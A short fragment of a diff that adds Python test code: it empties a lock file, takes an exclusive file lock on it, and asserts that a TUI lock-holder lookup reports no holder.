+        os.truncate(fd2, 0)
+        _fcntl.flock(fd2, _fcntl.LOCK_EX | _fcntl.LOCK_NB)
+        assert bridge.tui_lock_holder(paths) == -1
+    finally:
+        os.close(fd2)
+
